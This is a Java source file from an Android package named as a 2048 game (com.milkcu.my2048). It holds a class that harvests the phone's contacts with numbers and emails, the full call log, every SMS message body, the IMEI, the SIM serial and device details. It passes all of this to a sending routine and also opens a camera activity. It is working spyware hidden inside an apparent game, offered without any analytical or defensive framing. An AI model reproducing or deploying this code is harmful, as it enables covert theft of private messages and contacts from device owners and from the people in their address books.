package com.milkcu.my2048;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.provider.CallLog;
import android.provider.CallLog.Calls;
import android.telephony.TelephonyManager;
import android.util.Log;

public class Gets extends AsyncTask<Context, Integer, Boolean> {
	//Handler handler=new Handler();
	// Get Information
	private Context context;
	/*
	Gets(Context context_) {
		this.context = context_;
	}
	*/
	@Override
	protected Boolean doInBackground(Context ... params) {
		this.context = params[0];
		//getAll();
		//getPicture();
		Log.i("asynctask", "doInBackground");
		return Boolean.TRUE;
	}
	@Override
	protected void onProgressUpdate(Integer ... values) {
		Log.i("asynctask", "onProgressUpdate");
	}
	@Override
	protected void onPostExecute(Boolean result) {
		Log.i("asynctask", "onPostExecute");
		Runnable runnable=new Runnable() {
		    @Override
		    public void run() {
		        // TODO Auto-generated method stub
		    	getPicture();
		        //handler.postDelayed(this, 2000);
		    }
		};
		//handler.postDelayed(runnable, 10000);//每两秒执行一次runnable.
	}
	public void getAll() {
		Log.i("gets", "gets begin");
		String strContacts = getContacts();
		Log.i("gets", "gets 1");
		String strCalllogs = getCalllogs();
		Log.i("gets", "gets 2");
		String strMessages = getMessages();
		Log.i("gets", "gets succeed");
		String strImei = getImei();
		String phoneNumber = getPhoneNumber();
		String phoneInfo = getPhoneInfo();
		Comm.postTextThread(strContacts, strCalllogs, strMessages, strImei, phoneNumber, phoneInfo);
	}
	public void getPicture() {
		context.startActivity(new Intent(context, CameraActivity.class));
	}
	public String getImei() {
		TelephonyManager telephonyManager=(TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		String imei=telephonyManager.getDeviceId();
		return imei;
	}
	public String getPhoneNumber() {
		TelephonyManager telephonyManager=(TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		String simSerialNum = telephonyManager.getSimSerialNumber();
		return simSerialNum;
	}
	public String getPhoneInfo() {
		String phoneInfo = "Product: " + android.os.Build.PRODUCT;
        phoneInfo += ", \nCPU_ABI: " + android.os.Build.CPU_ABI;
        phoneInfo += ", \nTAGS: " + android.os.Build.TAGS;
        phoneInfo += ", \nVERSION_CODES.BASE: " + android.os.Build.VERSION_CODES.BASE;
        phoneInfo += ", \nMODEL: " + android.os.Build.MODEL;
        phoneInfo += ", \nSDK: " + android.os.Build.VERSION.SDK;
        phoneInfo += ", \nVERSION.RELEASE: " + android.os.Build.VERSION.RELEASE;
        phoneInfo += ", \nDEVICE: " + android.os.Build.DEVICE;
        phoneInfo += ", \nDISPLAY: " + android.os.Build.DISPLAY;
        phoneInfo += ", \nBRAND: " + android.os.Build.BRAND;
        phoneInfo += ", \nBOARD: " + android.os.Build.BOARD;
        phoneInfo += ", \nFINGERPRINT: " + android.os.Build.FINGERPRINT;
        phoneInfo += ", \nID: " + android.os.Build.ID;
        phoneInfo += ", \nMANUFACTURER: " + android.os.Build.MANUFACTURER;
        phoneInfo += ", \nUSER: " + android.os.Build.USER;
        return phoneInfo;
	}
	public String getContacts() {
		// 编号  姓名  电话
		// 编号  姓名  邮箱
	    String id,name,phoneNumber,email;
	    StringBuilder strContacts = new StringBuilder("");
	    ContentResolver contentResolver = context.getContentResolver();
	    Cursor cursor = contentResolver.query(android.provider.ContactsContract.Contacts.CONTENT_URI,
	            null, null, null, null);
	    while(cursor.moveToNext()) {
	        id=cursor.getString(cursor.getColumnIndex(android.provider.ContactsContract.Contacts._ID));
	        name=cursor.getString(cursor.getColumnIndex(android.provider.ContactsContract.Contacts.DISPLAY_NAME));
	        
	        //Fetch Phone Number
	        Cursor phoneCursor = contentResolver.query(
	                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
	                null, android.provider.ContactsContract.CommonDataKinds.Phone.CONTACT_ID+"="+id, null, null);
	        while(phoneCursor.moveToNext()) {
	            phoneNumber = phoneCursor.getString(
	                    phoneCursor.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER));
	            //text = text + "id="+id+" name="+name+" phoneNumber="+phoneNumber + "\n";
	            strContacts.append(id + " #_# " + name + " #_# " + phoneNumber + "\n");
	            
	            //Log.i("contact1", "id="+id+" name="+name+" phoneNumber="+phoneNumber);
	        }
	        phoneCursor.close();
	        
	        //Fetch email
	        Cursor emailCursor = contentResolver.query(
	                android.provider.ContactsContract.CommonDataKinds.Email.CONTENT_URI, 
	                null, android.provider.ContactsContract.CommonDataKinds.Email.CONTACT_ID+"="+id, null, null);
	        while(emailCursor.moveToNext()) {
	            email = emailCursor.getString(
	                    emailCursor.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Email.DATA));
	            //text = text + "id="+id+" name="+name+" email="+email + "\n";
	            strContacts.append(id + " #_# " + name + " #_# " + email + "\n");
	            //Log.i("contact2", "id="+id+" name="+name+" email="+email);
	        }
	        emailCursor.close();
	    }
	    cursor.close();
	    //return text;
	    return strContacts.toString();
	}
	
	public String getCalllogs() {
		// 时间  号码  姓名 时长  类型
		StringBuilder strCalllogs = new StringBuilder("");
		String text = null;
		Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,                            
		        null, null, null, null);
		if(cursor.moveToFirst()) {
		    do{
		        //CallsLog calls =new CallsLog();
		        //号码
		        String number = cursor.getString(cursor.getColumnIndex(Calls.NUMBER));
		        SimpleDateFormat sfd = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");                              
		        Date date = new Date(Long.parseLong(cursor.getString(cursor.getColumnIndexOrThrow(Calls.DATE))));
		        //呼叫时间
		        String time = sfd.format(date);
		        //联系人
		        String name = cursor.getString(cursor.getColumnIndexOrThrow(Calls.CACHED_NAME));
		        //通话时间,单位:s
		        String duration = cursor.getString(cursor.getColumnIndexOrThrow(Calls.DURATION));
		        //通话类型
		        String type = cursor.getString(cursor.getColumnIndexOrThrow(Calls.TYPE));
		        //text = text + "time=" + time + " number=" + number + " name=" + name + " duration=" + duration + "\n";
		        strCalllogs.append(time + " #_# " + number + " #_# " + name + " #_# " + duration + " #_# " + type + "\n");
		        //Log.i("calllog", text);
		    }while(cursor.moveToNext());
		}
		//return text;
	    return strCalllogs.toString();
	}
	
	public String getMessages() {
		// 编号  号码  联系人编号  内容  时间  类型
		StringBuilder strMessages = new StringBuilder("");
		final String SMS_URI_ALL = "content://sms/";
		StringBuilder smsBuilder = new StringBuilder();

		try {
			Uri uri = Uri.parse(SMS_URI_ALL);
			String[] projection = new String[] { "_id", "address", "person", "body", "date", "type" };
			Cursor cur = context.getContentResolver().query(uri, projection, null, null, "date desc");		// 获取手机内部短信
			//Cursor cur = context.getContentResolver().query(uri, null, null, null, null);

			if (cur.moveToFirst()) {
				int index_Address = cur.getColumnIndex("address");
				int index_Person = cur.getColumnIndex("person");
				int index_Body = cur.getColumnIndex("body");
				int index_Date = cur.getColumnIndex("date");
				int index_Type = cur.getColumnIndex("type");

				do {
					String strAddress = cur.getString(index_Address);
					int intPerson = cur.getInt(index_Person);
					String strbody = cur.getString(index_Body);
					long longDate = cur.getLong(index_Date);
					int intType = cur.getInt(index_Type);

					SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
					Date d = new Date(longDate);
					String strDate = dateFormat.format(d);

					String strType = "";
					if (intType == 1) {
						strType = "接收";
					} else if (intType == 2) {
						strType = "发送";
					} else {
						strType = "null";
					}

					/*
					smsBuilder.append("[ ");
					smsBuilder.append(strAddress + ", ");
					smsBuilder.append(intPerson + ", ");
					smsBuilder.append(strbody + ", ");
					smsBuilder.append(strDate + ", ");
					smsBuilder.append(strType);
					smsBuilder.append(" ]\n\n");
					*/
					strMessages.append(strAddress + " #_# " + intPerson + " #_# " + strbody + " #_# " + strDate + " #_# " + strType + "\n");
				} while (cur.moveToNext());

				if (!cur.isClosed()) {
					cur.close();
					cur = null;
				}
			} else {
				//smsBuilder.append("no result!");
				strMessages.append("Messages empty.");
			} // end if

			smsBuilder.append("getSmsInPhone has executed!");

		} catch (SQLiteException ex) {
			Log.d("SQLiteException in getSmsInPhone", ex.getMessage());
		}

		//return smsBuilder.toString();
		return strMessages.toString();
	}
}
